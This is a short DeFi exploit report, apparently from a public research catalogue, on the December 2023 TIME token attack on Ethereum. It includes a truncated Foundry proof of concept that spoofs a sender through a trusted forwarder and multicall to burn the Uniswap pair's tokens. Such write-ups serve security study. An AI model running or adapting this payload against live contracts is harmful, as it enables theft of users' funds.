# [?] TIME - Arbitrary Address Spoofing Attack

## Summary
Severity: Unknown
Chain: Ethereum
Component: TIME
Published: 2023-12-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/TIME_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~84.59 ETH
References:
- https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure

```solidity
contract ContractTest is Test {
    ITIME private constant TIME = ITIME(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V2 private constant TIME_WETH = Uni_Pair_V2(0x760dc1E043D99394A10605B2FA08F123D60faF84);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IForwarder private constant Forwarder = IForwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
    address private constant recoverAddr = 0xa16A5F37774309710711a8B4E83b068306b21724;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_730_462);
        vm.label(address(TIME), "TIME");
        vm.label(address(WETH), "WETH");
        vm.label(address(TIME_WETH), "TIME_WETH");
        vm.label(address(Router), "Router");
        vm.label(address(Forwarder), "Forwarder");
        vm.label(recoverAddr, "recoverAddr");
    }

    function testExploit() public {
        deal(address(this), 5 ether);
        emit log_named_decimal_uint("Exploiter ETH balance before attack", address(this).balance, 18);
        TIME.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        WETH.deposit{value: 5 ether}();
        WETHToTIME();

        uint256 amountToBurn = 62_227_259_510 * 1e18;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(TIME.burn.selector, amountToBurn, address(TIME_WETH));
        bytes memory data = abi.encodeWithSelector(TIME.multicall.selector, datas);

        IForwarder.ForwardRequest memory request =
            IForwarder.ForwardRequest({from: recoverAddr, to: address(TIME), value: 0, gas: 5e6, nonce: 0, data: data});
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/TIME_exp.sol_
